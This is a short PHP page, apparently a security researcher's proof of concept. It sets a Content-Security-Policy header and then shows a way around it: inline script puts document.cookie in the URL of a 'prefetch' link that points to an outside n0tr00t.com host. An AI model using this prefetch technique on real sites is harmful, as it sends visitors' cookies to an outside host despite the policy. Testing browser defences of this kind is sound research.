<?php

    header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';");

    ?>

    <html>
    <head></head>
    <body>
        csp header test
        <script>
        document.cookie = "csp=" + escape("sad@jisajid&*JDSJddsajhdsajkh21sa213123o1") + ";";

        var n0t = document.createElement("link");
        n0t.setAttribute("rel", "prefetch");
        n0t.setAttribute("href", "//1J38ax.chromecsptest.test.n0tr00t.com/?" + document.cookie);
        document.head.appendChild(n0t);
        </script>
    </body>
    </html>